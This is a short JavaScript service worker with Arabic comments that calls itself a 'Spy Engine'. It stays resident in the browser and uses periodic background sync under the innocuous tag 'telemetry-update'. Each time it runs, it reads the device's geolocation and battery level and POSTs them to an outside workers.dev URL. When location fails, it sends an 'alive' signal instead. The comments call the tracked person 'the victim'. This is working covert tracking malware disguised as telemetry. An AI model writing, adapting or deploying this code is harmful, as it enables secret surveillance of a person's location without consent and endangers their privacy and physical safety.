const WORKER_URL = "https://pylod.zaid00dd.workers.dev/";

// تثبيت المحرك وضمان بقائه في الذاكرة
self.addEventListener('install', (event) => {
    self.skipWaiting();
    console.log("Spy Engine Installed");
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

// القنص الدوري (يعمل في الخلفية)
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'telemetry-update') {
        event.waitUntil(sendTelemetry());
    }
});

async function sendTelemetry() {
    try {
        // محاولة جلب الموقع الجغرافي إذا سمح الضحية (بضغطة واحدة سابقاً)
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });

        const data = {
            type: "TRACKING_UPDATE",
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            bat: (await navigator.getBattery()).level * 100 + "%",
            time: new Date().toISOString()
        };

        await fetch(WORKER_URL, {
            method: 'POST',
            body: JSON.stringify(data)
        });
    } catch (e) {
        // في حال فشل الموقع، نرسل إشارة بقاء فقط
        fetch(WORKER_URL, { method: 'POST', body: JSON.stringify({ type: "ALIVE_SIGNAL" }) });
    }
}
